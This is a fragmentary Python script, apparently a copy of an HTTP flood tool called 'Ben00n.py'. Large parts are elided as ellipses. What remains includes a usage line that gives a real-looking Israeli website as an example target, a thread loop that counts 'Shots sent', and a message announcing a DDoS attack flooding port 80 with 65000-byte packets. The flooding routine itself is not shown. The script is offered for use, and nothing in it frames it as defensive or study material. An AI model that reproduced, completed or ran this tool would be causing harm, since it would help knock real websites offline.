...
def usage():
    print('---------------------------------------------------')
    print('USAGE: python Ben00n.py <url>')
    print('EXAMPLE: python Ben00n.py http://luthi.co.il/') 
    print("\a")
print("""
                   ...
                 ;::::;     Starting...
    ...
    def run(self):
        ...
        while flag == 0:
            if (previous + 100 < request_counter) & (previous != request_counter):
                print("%d Shots sent" % request_counter)
                previous = request_counter
        if flag == 2:
            print("\n -M60 Hits are complete")
...
if len(sys.argv) < 2:
    ...
    if sys.argv[1] == "help":
        ...
        print('Flooding http Port 80 with 65000-byte packets for 99999 By DDoS Attack')
        if len(sys.argv) == 3:
            if sys.argv[2] == "safe":
                set_safe()
        url = sys.argv[1]
